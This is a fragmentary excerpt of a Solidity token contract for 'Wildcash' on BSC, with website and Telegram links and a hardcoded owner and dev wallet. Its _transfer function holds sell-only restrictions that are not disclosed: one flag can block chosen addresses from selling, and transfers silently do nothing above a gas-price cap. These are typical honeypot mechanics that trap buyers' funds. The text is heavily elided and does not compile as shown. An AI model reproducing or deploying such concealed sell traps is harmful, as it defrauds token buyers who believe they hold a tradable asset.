...
/**
Wildcash
Website: https://www.wildcash.org/
Telegram: https://t.me/WildcashBSC
*/
...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0x2CCB186fa7B6b52029b1024A2EB0876FdE63Cc35;
...
contract Wildcash is Context, IERC20, Ownable { 
    ...
    */
    ...
    address payable private Wallet_Dev = payable(0x2CCB186fa7B6b52029b1024A2EB0876FdE63Cc35);
    ...
    */
    ...
    string private _name = "Wildcash"; 
    string private _symbol = "Wildcash";  
    ...
    function _transfer(
        ...
        */
        ...
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to] || (noFeeToTransfer && from != uniswapV2Pair && to != uniswapV2Pair)){
            ...
            takeFee = false;
        } else if (from == uniswapV2Pair){_TotalFee = _buyFee;} else if (to == uniswapV2Pair){require(!_isIncludedFromFee[from]); if (tx.gasprice > maxGwei) return;_TotalFee = _sellFee;}
